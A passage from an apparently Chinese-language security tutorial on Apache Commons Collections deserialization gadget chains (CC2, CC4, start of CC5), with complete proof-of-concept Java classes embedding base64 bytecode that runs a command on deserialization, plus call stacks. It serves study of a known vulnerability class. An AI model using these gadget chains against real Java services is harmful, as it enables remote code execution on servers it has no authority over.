java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformingComparator</span>&lt;I, O&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Comparator</span>&lt;I&gt;, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">3456940356043606220L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Comparator&lt;O&gt; decorated;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Transformer&lt;? <span class="hljs-built_in">super</span> I, ? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">O</span>&gt; transformer;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TransformingComparator</span><span class="hljs-params">(Transformer&lt;? <span class="hljs-built_in">super</span> I, ? extends O&gt; transformer)</span> &#123;<br>        <span class="hljs-built_in">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(I obj1, I obj2)</span> &#123;<br>        <span class="hljs-comment">//关键点</span><br>        <span class="hljs-type">O</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>        <span class="hljs-type">O</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>CC2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Apache_Common_Collections.cc_1_7;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections2</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-comment">//字节码</span><br>            <span class="hljs-type">byte</span>[] code = Base64.decode(<span class="hljs-string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);<br><br>            <span class="hljs-comment">//反射设置 Field</span><br>            <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>            setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>            setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>            setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>            <span class="hljs-comment">//为了执行 templates.newTransformer</span><br>            <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>            <span class="hljs-comment">//TransformingComparator 实例</span><br>            <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(invokerTransformer);<br><br>            <span class="hljs-comment">//PriorityQueue 实例</span><br>            <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>);<br>            <span class="hljs-comment">//先设置为正常变量值，后面可以通过setFieldValue修改</span><br>            priorityQueue.add(<span class="hljs-number">1</span>);<br>            priorityQueue.add(<span class="hljs-number">1</span>);<br><br>            <span class="hljs-comment">//反射设置 Field</span><br>            Object[] objects = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;;<br>            setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, objects);<br>            setFieldValue(priorityQueue, <span class="hljs-string">&quot;comparator&quot;</span>, comparator);<br><br>            <span class="hljs-comment">//序列化</span><br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>            oos.writeObject(priorityQueue);<br>            oos.flush();<br>            oos.close();<br><br>            <span class="hljs-comment">//测试反序列化</span><br>            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>            ois.readObject();<br>            ois.close();<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br><br>    <span class="hljs-comment">//反射设置 Field</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object object, String fieldName, Object value)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            field.set(object, value);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">-&gt;PriorityQueue.readObject()<br>      -&gt;PriorityQueue.heapify()<br>          -&gt;PriorityQueue.siftDown()<br>            -&gt;PriorityQueue.siftDownUsingComparator()<br>                -&gt;TransformingComparator.compare()<br>                    -&gt;InvokerTransformer.transform()<br>                        -&gt;TemplatesImpl.newTransformer()<br>                        -&gt;…………<br></code></pre></td></tr></table></figure><h3 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h3><p><strong>测试环境</strong>：4.0，jdk7u21及以前</p><p>CC4 只是将 CC2 中的 InvokerTransformer 替换为了 InstantiateTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Apache_Common_Collections.cc_1_7;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-comment">//与cc2类似</span><br><span class="hljs-comment">//InvokeTransformer 变为 InstantiateTransformer</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections4</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-comment">//字节码</span><br>            <span class="hljs-type">byte</span>[] code = Base64.decode(<span class="hljs-string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj&quot;</span>);<br><br>            <span class="hljs-comment">//反射设置 Field</span><br>            <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>            setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>            setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>            setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>            <span class="hljs-comment">//Transformer数组</span><br>            Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>            &#125;;<br><br><br>            <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>            <span class="hljs-comment">//TransformingComparator 实例</span><br>            <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br><br>            <span class="hljs-comment">//PriorityQueue 实例</span><br>            <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>);<br>            <span class="hljs-comment">//先设置为正常变量值，后面可以通过setFieldValue修改</span><br>            priorityQueue.add(<span class="hljs-number">1</span>);<br>            priorityQueue.add(<span class="hljs-number">1</span>);<br><br>            <span class="hljs-comment">//反射设置 Field</span><br>            Object[] objects = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;;<br>            setFieldValue(priorityQueue, <span class="hljs-string">&quot;queue&quot;</span>, objects);<br>            setFieldValue(priorityQueue, <span class="hljs-string">&quot;comparator&quot;</span>, comparator);<br><br>            <span class="hljs-comment">//序列化</span><br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>            oos.writeObject(priorityQueue);<br>            oos.flush();<br>            oos.close();<br><br>            <span class="hljs-comment">//测试反序列化</span><br>            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>            ois.readObject();<br>            ois.close();<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br><br>    <span class="hljs-comment">//反射设置 Field</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object object, String fieldName, Object value)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            field.set(object, value);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>大体调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">-&gt;PriorityQueue.readObject()<br>      -&gt;PriorityQueue.heapify()<br>          -&gt;PriorityQueue.siftDown()<br>            -&gt;PriorityQueue.siftDownUsingComparator()<br>                 -&gt;TransformingComparator.compare()<br>                    -&gt;ChainedTransformer.transform()<br>                        -&gt;ConstantTransformer.transform()<br>                                    -&gt;InstantiateTransformer.transform()<br>                             -&gt;TrAXFilter.TrAXFilter()<br>                                 -&gt;TemplatesImpl.newTransformer()<br>                                        -&gt;…………<br></code></pre></td></tr></table></figure><h3 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h3><p><strong>测试环境</strong>：3.1-3.2.1，jdk1.8</p><p>这里我们又回到了去触发 LazyMap.get()，只不过我们改变了 LazyMap.get() 的触发方式，不再和 CC1 和 CC3 一样借助 AnnotationInvocationHandler 的反序列化触发。</p><p>这里引入新类 TiedMapEntry：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Entry</span>, KeyValue, Serializable &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">8453869361373831205L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object key;<br><br>    <span class="hljs-comment">//构造函数，显然我们可以控制 this.map 为 LazyMap</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> &#123;<br>        <span class="hljs-built_in">this</span>.map = map;<br>        <span class="hljs-built_in">this</span>.key = key;<br>    &#125;<br><br>    <span class="hljs-comment">//toString函数，注意这里调用了 getValue()</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.getKey() + <span class="hljs-string">&quot;=&quot;</span> + <span class="hljs-built_in">this</span>.getValue();<br>    &#125;<br><br>    <span class="hljs-comment">//跟进 getValue(), 这是关键点 this.map.get() 触发 LazyMap.get()</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title 